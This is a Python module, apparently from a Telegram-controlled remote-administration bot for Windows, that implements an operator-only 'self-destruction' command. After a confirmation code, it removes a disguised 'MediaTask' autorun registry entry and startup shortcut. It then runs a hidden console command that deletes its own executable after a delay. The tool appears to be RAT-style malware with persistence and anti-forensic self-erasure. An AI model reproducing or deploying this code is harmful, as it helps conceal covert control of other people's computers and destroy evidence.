##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from config import ALLOWED_USER_ID
import sys, subprocess, time
import os, winreg
from lib.states import self_destruction
import random

password = ''.join(random.choice('0123456789') for _ in range(8))

def register_self_destruction(dp):
    @dp.message(F.text.lower() == "самоуничтожение")
    @dp.message(Command("self_destruction"))
    async def start_move_file(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:
            await message.answer(
                f"Вы уверены что хотите это сделать? \nДля подтверждения отправтее эту комбинацию: {password}")
            await state.set_state(self_destruction.waiting_code)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")
    @dp.message(self_destruction.waiting_code)
    async def get_destination_path(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:
            code = message.text

            if code == password:
                await message.answer("Было приятно с вами поработать, root. Выполняю протокол 'самоуничтожение'.")

                def remove_from_autorun(program_name):
                    # Путь к папке автозагрузки для текущего пользователя
                    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs',
                                                'Startup')

                    # Полный путь к возможному файлу автозагрузки
                    program_path = os.path.join(startup_folder,
                                                program_name + '.lnk')  # Обычно файлы автозагрузки имеют расширение .lnk

                    try:
                        # Открываем ключ автозагрузки в реестре
                        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                                0, winreg.KEY_SET_VALUE)

                        # Попробуем удалить запись с именем программы
                        try:
                            winreg.DeleteValue(reg_key, program_name)
                        except FileNotFoundError:
                            pass

                        # Закрываем ключ
                        winreg.CloseKey(reg_key)

                        # Проверяем и удаляем файл из папки автозагрузки
                        if os.path.isfile(program_path):
                            os.remove(program_path)

                    except Exception:
                        pass
                
                program_name = "MediaTask"  # Укажите имя программы без расширения
                remove_from_autorun(program_name)

                def self_destruct():
                    # Получаем путь к исполняемому файлу
                    exe_path = sys.executable

                    # Команда для удаления файла через командную строку
                    delete_command = f'del "{exe_path}"'

                    # Запускаем команду в скрытом режиме, без открытия консоли
                    subprocess.Popen(f'ping localhost -n 6 > nul && {delete_command}',
                                    shell=True,
                                    creationflags=subprocess.CREATE_NO_WINDOW)
             
                time.sleep(1)  
                self_destruct()
                sys.exit()  
                
            else:
                await message.answer("Комбинация была введена неверно. Продолжаю работать дальше с вами, Сэр.")
                await state.clear()
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")